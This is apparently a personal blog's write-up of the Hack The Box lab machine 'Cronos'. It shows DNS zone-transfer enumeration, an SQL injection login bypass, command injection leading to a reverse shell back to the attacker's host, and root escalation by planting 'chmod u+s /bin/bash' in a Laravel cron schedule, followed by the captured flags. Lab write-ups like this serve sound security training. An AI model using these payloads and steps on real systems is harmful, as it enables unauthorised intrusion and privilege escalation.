<!doctype html> <head> <meta charset=utf-8> <meta name=viewport content="width=device-width,initial-scale=1"> <meta name=theme-color content=#333333> <base href=/logbook/ > <link href=global.css rel=stylesheet> <link href=fonts.css rel=stylesheet> <link href=highlight.css rel=stylesheet> <link href=manifest.json rel=manifest> <link href=as-logo2.ico rel=icon type=image/png> <link href=client/main.979473326.css rel=stylesheet> <noscript id=sapper-head-start></noscript><title>HTB - Cronos</title><meta content=article property=og:type><meta content="HTB - Cronos" property=og:title><meta name=Description content=""><meta content="" property=og:description><meta name=twitter:card content=summary_large_image><meta name=twitter:title value="HTB - Cronos"><meta name=twitter:description content=""><meta name=twitter:label1 value="Published on"><meta name=twitter:data1 value="Apr 29, 2021"><meta name=twitter:label2 value="Reading Time"><meta name=twitter:data2 value="4 min read"><noscript id=sapper-head-end></noscript> </head> <body> <div id=sapper> <div class="svelte-v25qrq layout"> <header class=svelte-y9ah38> <a href=/ > <img alt=Sapper src=as-logo2.ico class=svelte-1u41owj> </a> <nav class=svelte-16qpxtx> <a href=. class=svelte-16qpxtx>Home</a> <a href=blog rel=prefetch class="svelte-16qpxtx selected">Blog</a> <a href=https://anu-bhav.github.io class=svelte-16qpxtx>Website</a> </nav> </header> <main class=svelte-v25qrq> <header class=svelte-ww3xvk> <p class=svelte-ww3xvk>April 29, 2021 ~ 4 min read</p> <h1 class=svelte-ww3xvk>HTB - Cronos</h1> <a href=pdf/Cronos.pdf target=_blank rel=nofollow class=svelte-ww3xvk id=pdf_link>View As PDF</a> <hr class=svelte-ww3xvk> </header> <div class=container> <article class=content> <h1 id=cronos---10101013>Cronos - 10.10.10.13</h1> <h1 id=enumeration>Enumeration</h1> <h2 id=nmap>Nmap</h2> <pre class=language-bash><code class=language-bash>nmap -sC -sV -oA nmap/initial 10.10.10.13</code></pre><pre class=language-bash><code class=language-bash># Nmap 7.91 scan initiated Thu Apr 29 13:00:15 2021 as: nmap -sC -sV -T4 -oA nmap/initial 10.10.10.13
Nmap scan report for 10.10.10.13
Host is up (0.24s latency).
Not shown: 997 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 18:b9:73:82:6f:26:c7:78:8f:1b:39:88:d8:02:ce:e8 (RSA)
|   256 1a:e6:06:a6:05:0b:bb:41:92:b0:28:bf:7f:e5:96:3b (ECDSA)
|_  256 1a:0e:e7:ba:00:cc:02:01:04:cd:a3:a9:3f:5e:22:20 (ED25519)
53/tcp open  domain  ISC BIND 9.10.3-P4 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.10.3-P4-Ubuntu
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Apr 29 13:00:45 2021 -- 1 IP address (1 host up) scanned in 30.63 seconds</code></pre><h2 id=website>Website</h2> <p>Going to the <a href=http://10.10.10.13 target=_blank rel=nofollow>http://10.10.10.13</a>, it is a default apache webpage.</p> <p><img alt="" src=Cronos.assets/image-20210429134408046.png></p> <h2 id=dns-enumeration>DNS Enumeration</h2> <p>Since port 53 is open and dns is setup, the machine could have some virtual host routing setup.</p> <pre class=language-bash><code class=language-bash>$ nslookup
# the server is setup, this will define where the queries are sent
> server 10.10.10.13 
Default server: 10.10.10.13
Address: 10.10.10.13#53
# the server is told to query itself on localhost
> 127.0.0.1
1.0.0.127.in-addr.arpa  name = localhost.
# the server is told to query the public ip address
> 10.10.10.13
13.10.10.10.in-addr.arpa        name = ns1.cronos.htb.</code></pre><p>A dns entry is revealed with a subdomain.</p> <pre class=language-bash><code class=language-bash>$ dig axfr cronos.htb @10.10.10.13 

; &lt;&lt;>> DiG 9.16.13-Debian &lt;&lt;>> axfr cronos.htb @10.10.10.13
;; global options: +cmd
cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
cronos.htb.             604800  IN      NS      ns1.cronos.htb.
cronos.htb.             604800  IN      A       10.10.10.13
admin.cronos.htb.       604800  IN      A       10.10.10.13
ns1.cronos.htb.         604800  IN      A       10.10.10.13
www.cronos.htb.         604800  IN      A       10.10.10.13
cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
;; Query time: 788 msec
;; SERVER: 10.10.10.13#53(10.10.10.13)
;; WHEN: Thu Apr 29 13:53:24 EDT 2021
;; XFR size: 7 records (messages 1, bytes 203)</code></pre><p>Several domains are revealed when looking for dns zone transfers</p> <ul> <li><a href="" target=_blank rel=nofollow>cronos.htb</a></li> <li><a href="" target=_blank rel=nofollow>www.cronos.htb</a></li> <li><a href="" target=_blank rel=nofollow>admin.cronos.htb</a></li> <li><a href="" target=_blank rel=nofollow>ns1.cronos.htb</a></li> </ul> <p>The above domains are added to the <strong>/etc/hosts</strong> file.</p> <p><strong>ns1.cronos.htb</strong></p> <p><img alt="" src=Cronos.assets/image-20210429141923272.png></p> <p><strong><a href=http://www.cronos.htb target=_blank rel=nofollow>www.cronos.htb</a></strong>, <strong>cronos.htb</strong></p> <p><img alt="" src=Cronos.assets/image-20210429141623055.png></p> <p>admin.cronos.htb</p> <p><img alt="" src=Cronos.assets/image-20210429142110168.png></p> <p>After trying basic SQl injection <code>admin' or 1=1 -- -</code> in the login page, the attacker can bypass the login.</p> <p><img alt="" src=Cronos.assets/image-20210429142346516.png></p> <p>The attacker can execute code when trying command injection payload <code>;ls</code> in the input field.</p> <p><img alt="" src=Cronos.assets/image-20210429142725304.png></p> <h1 id=exploitation>Exploitation</h1> <h3 id=getting-a-reverse-shell>Getting a reverse shell</h3> <p>Intercepting the post request on burp, commands can be easily executed on the server. </p> <p><img alt="" src=Cronos.assets/image-20210429145546248.png></p> <p>The tools used here to generate quick reverse shell is called <a href=https://github.com/mthbernardes/rsg target=_blank rel=nofollow>rsg or reverse shell generator</a></p> <pre class=language-bash><code class=language-bash># generates payload and as well as listens on the specified port
rsg 10.10.14.23 8888 bash</code></pre><p>The attacker then uploads the shell.php and sets up <strong>nc</strong> to listen for an incoming connection on port <strong>8888</strong>.</p> <p>The command is first url encoded before sending it to the server.</p> <p><img alt="" src=Cronos.assets/image-20210429150112820.png></p> <p>The reverse shell is then stabilised using the following commands.</p> <pre class=language-bash><code class=language-bash>which python3 # to know which python version exists
python3 -c 'import pty;pty.spawn("/bin/bash")' # gets a proper tty shell
# the shell is then backgrounded using ctrl+z
stty raw -echo # this is executed on the attackers machine
# then press fg to resume the tty shell
export TERM=xterm # after setting the terminal type, the screen can now be cleared
stty rows 42 cols 172 # sets the size for the tty shell</code></pre><h1 id=post-exploitation>Post Exploitation</h1> <h2 id=privilege-escalation-to-root>Privilege Escalation to Root</h2> <p>After running LinEnum.sh from <a href=https://github.com/rebootuser/LinEnum target=_blank rel=nofollow>https://github.com/rebootuser/LinEnum</a>, it is known that a cronjob is running on the server.</p> <p><img alt="" src=Cronos.assets/image-20210429153151953.png></p> <h3 id=vulnerability-explanation><strong>Vulnerability Explanation:</strong></h3> <p>Since the cronjob is ran as root, if the attacker can control a schedule task, it will be ran with root privileges. Upon researching, the file <strong>/var/www/laravel/app/Console/Kernel.php</strong> needs to edited to add a task.</p> <pre class=language-bash><code class=language-bash>find / -name "Kernel.php" -ls 2>/dev/null</code></pre><p>The file is owned by the user <strong>www-data</strong> and the current shell is as that specific user. Hence the attacker can modify the file as needed.</p> <p><img alt="" src=Cronos.assets/image-20210429153956388.png></p> <p>source: <a href=https://tutsforweb.com/how-to-set-up-task-scheduling-cron-job-in-laravel/ target=_blank rel=nofollow>https://tutsforweb.com/how-to-set-up-task-scheduling-cron-job-in-laravel/</a></p> <p><img alt="" src=Cronos.assets/image-20210429153632588.png></p> <p>source: <a href=https://vegibit.com/scheduling-commands-and-tasks-in-laravel/ target=_blank rel=nofollow>https://vegibit.com/scheduling-commands-and-tasks-in-laravel/</a></p> <p><img alt="" src=Cronos.assets/image-20210429154116336.png></p> <pre class=language-php><code class=language-php>    protected function schedule(Schedule $schedule)
    {
        // $schedule->command('inspire')
        //          ->hourly();
        $schedule->exec('chmod u+s /bin/bash')->everyMinute();
    }</code></pre><p>After the setuid of <strong>/bin/bash</strong> when executing <code>bash -p</code>, the attacker can have the shell of the current user have an effective user ID or euid of root.</p> <p><img alt="" src=Cronos.assets/image-20210429161104987.png></p> <h3 id=usertxt>User.txt</h3> <pre class=language-bash><code class=language-bash>find /home -type f -ls 2>/dev/null | grep user</code></pre><p><strong>User.txt</strong> can be found in the home directory of <strong>noulis</strong>.</p> <pre class=language-bash><code class=language-bash>cat /home/noulis/user.txt</code></pre><p><img alt="" src=Cronos.assets/image-20210429161454130.png></p> <blockquote> <p>user.txt flag: <code>51d236438b333970dbba7dc3089be33b</code></p> </blockquote> <h3 id=roottxt>Root.txt</h3> <p>the <strong>root.txt</strong> file is always located in <strong>/root/</strong></p> <pre class=language-bash><code class=language-bash>cat /root/root.txt</code></pre><p><img alt="" src=Cronos.assets/image-20210429161557939.png></p> <blockquote> <p>root.txt flag: <code>1703b8a3c9a8dde879942c79d02fd3a0</code></p> </blockquote> </article> <hr> <button class="back-to-top hidden svelte-h76b9j"> <svg aria-hidden=true class="" id="" role=img style=height:1em;line-height:.75em;font-size:1.33333em;vertical-align:-.225em;overflow:visible viewBox="0 0 448 512" xmlns=http://www.w3.org/2000/svg> <g transform="translate(256 256)"> <g transform=""> <path d="M34.9 289.5l-22.2-22.2c-9.4-9.4-9.4-24.6 0-33.9L207 39c9.4-9.4 24.6-9.4 33.9 0l194.3 194.3c9.4 9.4 9.4 24.6 0 33.9L413 289.4c-9.5 9.5-25 9.3-34.3-.4L264 168.6V456c0 13.3-10.7 24-24 24h-32c-13.3 0-24-10.7-24-24V168.6L69.2 289.1c-9.3 9.8-24.8 10-34.3.4z" fill=currentColor transform="translate(-256 -256)"></path> </g> </g> </svg> </button> <div class=svelte-1b2y202> <img alt="Anubhavsingh Sawdagur" src=profile-pic.png class=svelte-1b2y202> <p class=svelte-1b2y202> Hi, I'm <strong class=highlight>Anubhav</strong>. I'm an Ethical Hacker, Software Engineer and Network Engineer from Mauritius. <br> You can find me on <a href=https://www.instagram.com/_anu_bhav_/ target=_blank>Instagram</a>, <a href=https://www.twitter.com/0_Pr0t0typ3/ target=_blank>Twitter</a>, <a href=https://www.facebook.com/anubhav.s.0809/ target=_blank>Facebook</a> or <a href=https://www.linkedin.com/in/anubhavsingh-sawdagur/ target=_blank>LinkedIn</a>. See more of my work on <a href="https://github.com/Anu-bhav?tab=repositories" target=_blank>GitHub</a> or read about me on my <a href=https://anu-bhav.github.io/ target=_blank>Website</a> </p> </div> </div> </main> <footer class=svelte-v25qrq> <span> © 2021 Personal Blog. Powered by <a href=https://sapper.svelte.dev target=_blank>Sapper</a>. Template by <a href=https://anu-bhav.github.io target=_blank>Anubhavsingh Sawdagur</a>. </span> </footer> </div></div> <script>__SAPPER__={baseUrl:"/logbook",preloaded:[void 0,null,{pdf_location:"pdf\u002FCronos.pdf",has_pdf:true,post:{title:"HTB - Cronos",slug:"Cronos",html:"\u003Ch1 id=\"cronos---10101013\"\u003ECronos - 10.10.10.13\u003C\u002Fh1\u003E\n\u003Ch1 id=\"enumeration\"\u003EEnumeration\u003C\u002Fh1\u003E\n\u003Ch2 id=\"nmap\"\u003ENmap\u003C\u002Fh2\u003E\n\u003Cpre class=\"language-bash\"\u003E\u003Ccode class=\"language-bash\"\u003Enmap -sC -sV -oA nmap\u002Finitial 10.10.10.13\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Cpre class=\"language-bash\"\u003E\u003Ccode class=\"language-bash\"\u003E# Nmap 7.91 scan initiated Thu Apr 29 13:00:15 2021 as: nmap -sC -sV -T4 -oA nmap\u002Finitial 10.10.10.13\nNmap scan report for 10.10.10.13\nHost is up (0.24s latency).\nNot shown: 997 filtered ports\nPORT   STATE SERVICE VERSION\n22\u002Ftcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 18:b9:73:82:6f:26:c7:78:8f:1b:39:88:d8:02:ce:e8 (RSA)\n|   256 1a:e6:06:a6:05:0b:bb:41:92:b0:28:bf:7f:e5:96:3b (ECDSA)\n|_  256 1a:0e:e7:ba:00:cc:02:01:04:cd:a3:a9:3f:5e:22:20 (ED25519)\n53\u002Ftcp open  domain  ISC BIND 9.10.3-P4 (Ubuntu Linux)\n| dns-nsid: \n|_  bind.version: 9.10.3-P4-Ubuntu\n80\u002Ftcp open  http    Apache httpd 2.4.18 ((Ubuntu))\n|_http-server-header: Apache\u002F2.4.18 (Ubuntu)\n|_http-title: Apache2 Ubuntu Default Page: It works\nService Info: OS: Linux; CPE: cpe:\u002Fo:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https:\u002F\u002Fnmap.org\u002Fsubmit\u002F .\n# Nmap done at Thu Apr 29 13:00:45 2021 -- 1 IP address (1 host up) scanned in 30.63 seconds\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch2 id=\"website\"\u003EWebsite\u003C\u002Fh2\u003E\n\u003Cp\u003EGoing to the \u003Ca target=\"_blank\" rel=\"nofollow\" href=\"http:\u002F\u002F10.10.10.13\"\u003Ehttp:\u002F\u002F10.10.10.13\u003C\u002Fa\u003E, it is a default apache webpage.\u003C\u002Fp\u003E\n\u003Cp\u003E\u003Cimg src=\"Cronos.assets\u002Fimage-20210429134408046.png\" alt=\"\"\u003E\u003C\u002Fp\u003E\n\u003Ch2 id=\"dns-enumeration\"\u003EDNS Enumeration\u003C\u002Fh2\u003E\n\u003Cp\u003ESince port 53 is open and dns is setup, the machine could have some virtual host routing setup.\u003C\u002Fp\u003E\n\u003Cpre class=\"language-bash\"\u003E\u003Ccode class=\"language-bash\"\u003E$ nslookup\n# the server is setup, this will define where the queries are sent\n\u003E server 10.10.10.13 \nDefault server: 10.10.10.13\nAddress: 10.10.10.13#53\n# the server is told to query itself on localhost\n\u003E 127.0.0.1\n1.0.0.127.in-addr.arpa  name = localhost.\n# the server is told to query the public ip address\n\u003E 10.10.10.13\n13.10.10.10.in-addr.arpa        name = ns1.cronos.htb.\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Cp\u003EA dns entry is revealed with a subdomain.\u003C\u002Fp\u003E\n\u003Cpre class=\"language-bash\"\u003E\u003Ccode class=\"language-bash\"\u003E$ dig axfr cronos.htb @10.10.10.13 \n\n; &lt;&lt;\u003E\u003E DiG 9.16.13-Debian &lt;&lt;\u003E\u003E axfr cronos.htb @10.10.10.13\n;; global options: +cmd\ncronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800\ncronos.htb.             604800  IN      NS      ns1.cronos.htb.\ncronos.htb.             604800  IN      A       10.10.10.13\nadmin.cronos.htb.       604800  IN      A       10.10.10.13\nns1.cronos.htb.         604800  IN      A       10.10.10.13\nwww.cronos.htb.         604800  IN      A       10.10.10.13\ncronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800\n;; Query time: 788 msec\n;; SERVER: 10.10.10.13#53(10.10.10.13)\n;; WHEN: Thu Apr 29 13:53:24 EDT 2021\n;; XFR size: 7 records (messages 1, bytes 203)\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Cp\u003ESeveral domains are revealed when looking for dns zone transfers\u003C\u002Fp\u003E\n\u003Cul\u003E\n\u003Cli\u003E\u003Ca target=\"_blank\" rel=\"nofollow\" href=\"\"\u003Ecronos.htb\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca target=\"_blank\" rel=\"nofollow\" href=\"\"\u003Ewww.cronos.htb\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca target=\"_blank\" rel=\"nofollow\" href=\"\"\u003Eadmin.cronos.htb\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca target=\"_blank\" rel=\"nofollow\" href=\"\"\u003Ens1.cronos.htb\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003Cp\u003EThe above domains are added to the \u003Cstrong\u003E\u002Fetc\u002Fhosts\u003C\u002Fstrong\u003E file.\u003C\u002Fp\u003E\n\u003Cp\u003E\u003Cstrong\u003Ens1.cronos.htb\u003C\u002Fstrong\u003E\u003C\u002Fp\u003E\n\u003Cp\u003E\u003Cimg src=\"Cronos.assets\u002Fimage-20210429141923272.png\" alt=\"\"\u003E\u003C\u002Fp\u003E\n\u003Cp\u003E\u003Cstrong\u003E\u003Ca target=\"_blank\" rel=\"nofollow\" href=\"http:\u002F\u002Fwww.cronos.htb\"\u003Ewww.cronos.htb\u003C\u002Fa\u003E\u003C\u002Fstrong\u003E, \u003Cstrong\u003Ecronos.htb\u003C\u002Fstrong\u003E\u003C\u002Fp\u003E\n\u003Cp\u003E\u003Cimg src=\"Cronos.assets\u002Fimage-20210429141623055.png\" alt=\"\"\u003E\u003C\u002Fp\u003E\n\u003Cp\u003Eadmin.cronos.htb\u003C\u002Fp\u003E\n\u003Cp\u003E\u003Cimg src=\"Cronos.assets\u002Fimage-20210429142110168.png\" alt=\"\"\u003E\u003C\u002Fp\u003E\n\u003Cp\u003EAfter trying basic SQl injection \u003Ccode\u003Eadmin&#39; or 1=1 -- -\u003C\u002Fcode\u003E in the login page, the attacker can bypass the login.\u003C\u002Fp\u003E\n\u003Cp\u003E\u003Cimg src=\"Cronos.assets\u002Fimage-20210429142346516.png\" alt=\"\"\u003E\u003C\u002Fp\u003E\n\u003Cp\u003EThe attacker can execute code when trying command injection payload \u003Ccode\u003E;ls\u003C\u002Fcode\u003E in the input field.\u003C\u002Fp\u003E\n\u003Cp\u003E\u003Cimg src=\"Cronos.assets\u002Fimage-20210429142725304.png\" alt=\"\"\u003E\u003C\u002Fp\u003E\n\u003Ch1 id=\"exploitation\"\u003EExploitation\u003C\u002Fh1\u003E\n\u003Ch3 id=\"getting-a-reverse-shell\"\u003EGetting a reverse shell\u003C\u002Fh3\u003E\n\u003Cp\u003EIntercepting the post request on burp, commands can be easily executed on the server. \u003C\u002Fp\u003E\n\u003Cp\u003E\u003Cimg src=\"Cronos.assets\u002Fimage-20210429145546248.png\" alt=\"\"\u003E\u003C\u002Fp\u003E\n\u003Cp\u003EThe tools used here to generate quick  reverse shell is called \u003Ca target=\"_blank\" rel=\"nofollow\" href=\"https:\u002F\u002Fgithub.com\u002Fmthbernardes\u002Frsg\"\u003Ersg or reverse shell generator\u003C\u002Fa\u003E\u003C\u002Fp\u003E\n\u003Cpre class=\"language-bash\"\u003E\u003Ccode class=\"language-bash\"\u003E# generates payload and as well as listens on the specified port\nrsg 10.10.14.23 8888 bash\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Cp\u003EThe attacker then uploads the shell.php and sets up \u003Cstrong\u003Enc\u003C\u002Fstrong\u003E to listen for an incoming connection on port \u003Cstrong\u003E8888\u003C\u002Fstrong\u003E.\u003C\u002Fp\u003E\n\u003Cp\u003EThe command is first url encoded before sending it to the server.\u003C\u002Fp\u003E\n\u003Cp\u003E\u003Cimg src=\"Cronos.assets\u002Fimage-20210429150112820.png\" alt=\"\"\u003E\u003C\u002Fp\u003E\n\u003Cp\u003EThe reverse shell is then stabilised using the following commands.\u003C\u002Fp\u003E\n\u003Cpre class=\"language-bash\"\u003E\u003Ccode class=\"language-bash\"\u003Ewhich python3 # to know which python version exists\npython3 -c 'import pty;pty.spawn(\"\u002Fbin\u002Fbash\")' # gets a proper tty shell\n# the shell is then backgrounded using ctrl+z\nstty raw -echo # this is executed on the attackers machine\n# then press fg to resume the tty shell\nexport TERM=xterm # after setting the terminal type, the screen can now be cleared\nstty rows 42 cols 172 # sets the size for the tty shell\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch1 id=\"post-exploitation\"\u003EPost Exploitation\u003C\u002Fh1\u003E\n\u003Ch2 id=\"privilege-escalation-to-root\"\u003EPrivilege Escalation to Root\u003C\u002Fh2\u003E\n\u003Cp\u003EAfter running LinEnum.sh from \u003Ca target=\"_blank\" rel=\"nofollow\" href=\"https:\u002F\u002Fgithub.com\u002Frebootuser\u002FLinEnum\"\u003Ehttps:\u002F\u002Fgithub.com\u002Frebootuser\u002FLinEnum\u003C\u002Fa\u003E, it is known that a cronjob is running on the server.\u003C\u002Fp\u003E\n\u003Cp\u003E\u003Cimg src=\"Cronos.assets\u002Fimage-20210429153151953.png\" alt=\"\"\u003E\u003C\u002Fp\u003E\n\u003Ch3 id=\"vulnerability-explanation\"\u003E\u003Cstrong\u003EVulnerability Explanation:\u003C\u002Fstrong\u003E\u003C\u002Fh3\u003E\n\u003Cp\u003ESince the cronjob is ran as root, if the attacker can control a schedule task, it will be ran with root privileges. Upon researching, the file \u003Cstrong\u003E\u002Fvar\u002Fwww\u002Flaravel\u002Fapp\u002FConsole\u002FKernel.php\u003C\u002Fstrong\u003E needs to edited to add a task.\u003C\u002Fp\u003E\n\u003Cpre class=\"language-bash\"\u003E\u003Ccode class=\"language-bash\"\u003Efind \u002F -name \"Kernel.php\" -ls 2\u003E\u002Fdev\u002Fnull\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Cp\u003EThe file is owned by the user \u003Cstrong\u003Ewww-data\u003C\u002Fstrong\u003E and the current shell is as that specific user. Hence the attacker can modify the file as needed.\u003C\u002Fp\u003E\n\u003Cp\u003E\u003Cimg src=\"Cronos.assets\u002Fimage-20210429153956388.png\" alt=\"\"\u003E\u003C\u002Fp\u003E\n\u003Cp\u003Esource: \u003Ca target=\"_blank\" rel=\"nofollow\" href=\"https:\u002F\u002Ftutsforweb.com\u002Fhow-to-set-up-task-scheduling-cron-job-in-laravel\u002F\"\u003Ehttps:\u002F\u002Ftutsforweb.com\u002Fhow-to-set-up-task-scheduling-cron-job-in-laravel\u002F\u003C\u002Fa\u003E\u003C\u002Fp\u003E\n\u003Cp\u003E\u003Cimg src=\"Cronos.assets\u002Fimage-20210429153632588.png\" alt=\"\"\u003E\u003C\u002Fp\u003E\n\u003Cp\u003Esource: \u003Ca target=\"_blank\" rel=\"nofollow\" href=\"https:\u002F\u002Fvegibit.com\u002Fscheduling-commands-and-tasks-in-laravel\u002F\"\u003Ehttps:\u002F\u002Fvegibit.com\u002Fscheduling-commands-and-tasks-in-laravel\u002F\u003C\u002Fa\u003E\u003C\u002Fp\u003E\n\u003Cp\u003E\u003Cimg src=\"Cronos.assets\u002Fimage-20210429154116336.png\" alt=\"\"\u003E\u003C\u002Fp\u003E\n\u003Cpre class=\"language-php\"\u003E\u003Ccode class=\"language-php\"\u003E    protected function schedule(Schedule $schedule)\n    {\n        \u002F\u002F $schedule-\u003Ecommand('inspire')\n        \u002F\u002F          -\u003Ehourly();\n        $schedule-\u003Eexec('chmod u+s \u002Fbin\u002Fbash')-\u003EeveryMinute();\n    }\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Cp\u003EAfter the setuid of \u003Cstrong\u003E\u002Fbin\u002Fbash\u003C\u002Fstrong\u003E when executing \u003Ccode\u003Ebash -p\u003C\u002Fcode\u003E, the attacker can have the shell of the current user have an effective user ID or euid of root.\u003C\u002Fp\u003E\n\u003Cp\u003E\u003Cimg src=\"Cronos.assets\u002Fimage-20210429161104987.png\" alt=\"\"\u003E\u003C\u002Fp\u003E\n\u003Ch3 id=\"usertxt\"\u003EUser.txt\u003C\u002Fh3\u003E\n\u003Cpre class=\"language-bash\"\u003E\u003Ccode class=\"language-bash\"\u003Efind \u002Fhome -type f -ls 2\u003E\u002Fdev\u002Fnull | grep user\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Cp\u003E\u003Cstrong\u003EUser.txt\u003C\u002Fstrong\u003E can be found in the home directory of \u003Cstrong\u003Enoulis\u003C\u002Fstrong\u003E.\u003C\u002Fp\u003E\n\u003Cpre class=\"language-bash\"\u003E\u003Ccode class=\"language-bash\"\u003Ecat \u002Fhome\u002Fnoulis\u002Fuser.txt\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Cp\u003E\u003Cimg src=\"Cronos.assets\u002Fimage-20210429161454130.png\" alt=\"\"\u003E\u003C\u002Fp\u003E\n\u003Cblockquote\u003E\n\u003Cp\u003Euser.txt flag: \u003Ccode\u003E51d236438b333970dbba7dc3089be33b\u003C\u002Fcode\u003E\u003C\u002Fp\u003E\n\u003C\u002Fblockquote\u003E\n\u003Ch3 id=\"roottxt\"\u003ERoot.txt\u003C\u002Fh3\u003E\n\u003Cp\u003Ethe \u003Cstrong\u003Eroot.txt\u003C\u002Fstrong\u003E file is always located in \u003Cstrong\u003E\u002Froot\u002F\u003C\u002Fstrong\u003E\u003C\u002Fp\u003E\n\u003Cpre class=\"language-bash\"\u003E\u003Ccode class=\"language-bash\"\u003Ecat \u002Froot\u002Froot.txt\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Cp\u003E\u003Cimg src=\"Cronos.assets\u002Fimage-20210429161557939.png\" alt=\"\"\u003E\u003C\u002Fp\u003E\n\u003Cblockquote\u003E\n\u003Cp\u003Eroot.txt flag: \u003Ccode\u003E1703b8a3c9a8dde879942c79d02fd3a0\u003C\u002Fcode\u003E\u003C\u002Fp\u003E\n\u003C\u002Fblockquote\u003E\n",date:"2021-04-29",excerpt:"",printDate:"April 29, 2021",printReadingTime:"4 min read"}}]};if('serviceWorker' in navigator)navigator.serviceWorker.register('/logbook/service-worker.js');(function(){try{eval("async function x(){}");var main="/logbook/client/client.891f36b9.js"}catch(e){main="/logbook/client/legacy/client.41371eef.js"};var s=document.createElement("script");try{new Function("if(0)import('')")();s.src=main;s.type="module";s.crossOrigin="use-credentials";}catch(e){s.src="/logbook/client/shimport@1.0.1.js";s.setAttribute("data-main",main);}document.head.appendChild(s);}());</script> 